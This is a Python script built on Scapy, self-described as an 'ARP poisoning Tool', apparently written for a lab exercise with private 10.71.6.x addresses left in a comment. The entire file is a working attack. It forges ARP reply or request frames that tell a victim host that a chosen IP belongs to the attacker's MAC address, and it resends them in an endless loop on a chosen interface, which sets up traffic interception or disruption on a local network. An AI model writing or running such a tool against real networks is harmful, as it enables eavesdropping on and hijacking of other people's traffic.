from scapy.all import *
import argparse
import time

# complete with the appropriate values
"""
macAttacker = "bc:24:11:37:a7:a0"
ipAttacker = "10.71.6.5"

macVictim = "bc:24:11:69:ed:c6"
ipVictim = "10.71.6.4"

ipToSpoof = "10.71.6.6"
"""

def send_poison_arp(ipAttacker, macAttacker, ipVictim, macVictim, ipToSpoof, iface="ens18", mode="reply"):
    if (mode == "reply"):
        arp= Ether() / ARP()
        arp[Ether].src = macAttacker
        arp[ARP].hwsrc = macAttacker
        arp[ARP].psrc = ipToSpoof
        arp[ARP].hwdst = macVictim
        arp[ARP].pdst = ipVictim
        arp[ARP].op = 2
    elif (mode == "request"):
        arp= Ether() / ARP()
        arp[Ether].src = macAttacker
        arp[ARP].hwsrc = macAttacker
        arp[ARP].psrc = ipToSpoof
        arp[ARP].hwdst = macVictim
        arp[ARP].pdst = ipVictim
        arp[ARP].op = 1
    else:
        raise ValueError("Mode must be 'reply' or 'request'")

    print("[+] Sending ARP {} packets to {} claiming {} is {}".format(mode, ipVictim, ipToSpoof, macAttacker))
    sendp(arp, iface=iface, inter=5, loop=1)

#Testing
#send_poison_arp(ipAttacker, macAttacker, ipVictim, macVictim, ipToSpoof, "ens18", mode="reply")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP poisoning Tool")
    parser.add_argument("ipAttacker")
    parser.add_argument("macAttacker")
    parser.add_argument("ipVictim")
    parser.add_argument("macVictim")
    parser.add_argument("ipToSpoof")
    parser.add_argument("iface")
    parser.add_argument("--mode", choices=["reply", "request"], default="reply")

    args = parser.parse_args()
    send_poison_arp(
        ipAttacker=args.ipAttacker,
        macAttacker=args.macAttacker,
        ipVictim=args.ipVictim,
        macVictim=args.macVictim,
        ipToSpoof=args.ipToSpoof,
        iface=args.iface,
        mode=args.mode
    )
